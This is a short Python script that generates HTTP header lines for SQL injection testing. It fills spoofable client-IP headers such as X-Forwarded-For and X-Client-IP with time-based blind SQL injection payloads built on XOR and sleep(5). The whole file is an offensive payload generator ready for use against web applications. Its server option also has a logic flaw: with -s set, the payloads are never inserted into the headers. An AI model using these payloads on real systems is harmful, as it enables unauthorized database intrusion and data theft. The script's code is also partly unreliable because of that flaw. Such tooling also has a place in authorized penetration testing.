#!/usr/bin/env python3
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-pf", "--payloads_file", help="File containing list of payloads")
parser.add_argument("-hf", "--headers_file", help="File containing list of headers")
parser.add_argument("-s", "--server", help="Replace payloads with server name in headers")
args = parser.parse_args()

if args.payloads_file:
    with open(args.payloads_file) as f:
        payloads = f.readlines()
else:
    payloads = [
        "O'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",
        "0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z",
        # Add more payloads as needed
    ]

if args.headers_file:
    with open(args.headers_file) as f:
        headers = f.readlines()
else:
    headers = [
        "X-Remote-IP",
        "X-Originating-IP",
        "X-Remote-Addr",
        "X-Client-IP",
        "X-Forwarded-For"
    ]

for header in headers:
    if args.server:
        formatted_header = f"{header.strip()}: {args.server}"
    else:
        formatted_header = f"{header.strip()}: myload"

    for payload in payloads:
        formatted_header_payload = formatted_header.replace("myload", payload.strip()).replace("myserver", args.server and args.server or "")
        print(formatted_header_payload)
